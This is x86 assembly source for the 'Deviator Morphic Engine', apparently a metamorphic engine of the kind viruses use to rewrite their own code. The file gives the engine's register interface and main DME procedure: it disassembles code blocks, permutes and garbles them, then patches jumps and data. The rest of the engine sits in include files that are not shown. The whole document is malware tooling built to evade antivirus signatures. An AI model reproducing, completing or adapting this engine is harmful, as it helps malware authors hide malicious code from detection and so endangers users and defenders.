; Deviator Morphic Engine v.001beta

; Input
; ESi - Entry Point Src (with zero end)
; EDi - Dst
; EBX - ImageBase of code
; EDX - Offset to code
; ECX - Size of all code (including variables)
; EAX - Offset to some variable

; Output
; ECX - New Size
; EDi - is filled with permutated code
; EAX - New offset of variable

DME	proc
	add	ecx,edx
	mov	[MaxMorph][ebp],ecx			; Max Size
	mov	[xDst][ebp],edi
	mov	[xBase][ebp],ebx
	mov	[xSrc][ebp],edx
	mov	[xAddOffset][ebp],eax
	
	xor	eax,eax
	mov	[incheck][ebp],al
	mov	[Datan][ebp],eax
	mov	[BlockNum][ebp],eax
	mov	[Jmpn][ebp],eax
	mov	[Tbln][ebp],eax
	mov	[GarbLvl][ebp],al

	mov	al,0FFh
	mov	[RegMask][ebp],eax

;--------------------------------------------
;	Call	UserProc_InitTables
;--------------------------------------------
DoMorph:lodsd
	or	eax,eax
	jz	Morphed
	push	esi
	add	eax,ebp
	xchg	eax,esi
	Call	Analyse
	Call	CheckBlocks
	pop	esi
	jmp	DoMorph
Morphed:
	mov	eax,[Jmpn][ebp]
	mov	[G_Jxx][ebp],eax

	mov	esi,[xSrc][ebp]
	mov	edi,[xDst][ebp]
	Call	Morph
	push	ecx
	Call	PatchJumps
	Call	PatchData
;-------------------------------------------
;	Call	PatchTblData
;-------------------------------------------
	pop	ecx
	mov	eax,[xAddOffset][ebp]
	ret
DME	endp

include	a.inc
include	blocks.inc
include	morph.inc
include	disasmer.inc
include	jumps.inc
include	pdata.inc
include	tables.inc
include	mutate.inc
include	garble.inc

;include	user.inc
